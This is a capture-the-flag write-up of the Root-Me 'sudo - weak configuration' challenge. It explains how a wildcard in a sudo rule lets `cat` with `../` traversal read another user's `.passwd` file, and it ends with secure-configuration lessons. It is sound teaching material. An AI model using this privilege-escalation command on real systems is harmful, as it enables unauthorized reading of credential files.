# sudo - weak configuration

**Category** : App - Script  
**Difficulty** : Very easy  
**Points** : 5  
**Link** : [Root-Me](https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration)

---

## Description

Privilege escalation through misconfigured sudo permissions.

The administrator simplified their work without thinking about side effects...

---

## Analysis

**Check sudo privileges:**
```bash
sudo -l
```

Result:
```
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

The wildcard `*` allows **path traversal** — we can escape the `notes/` directory.

---

## Methodology

**1. Read the readme to find password location**
```bash
cat readme.md
```

The `.passwd` file is located in `/challenge/app-script/ch1/ch1cracked/`

**2. Exploit path traversal with wildcard**
```bash
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

The `../` escapes from `notes/` directory and accesses `ch1cracked/.passwd`

---

## Solution

By exploiting the wildcard in sudo configuration, we can read files outside the intended directory.

**Flag validated:** ✓

---

## What I learned

- **Sudo misconfigurations**: wildcards (`*`) in sudo rules are dangerous
- **Path traversal**: using `../` to escape directory restrictions
- **Secure sudo rules**: always specify exact paths without wildcards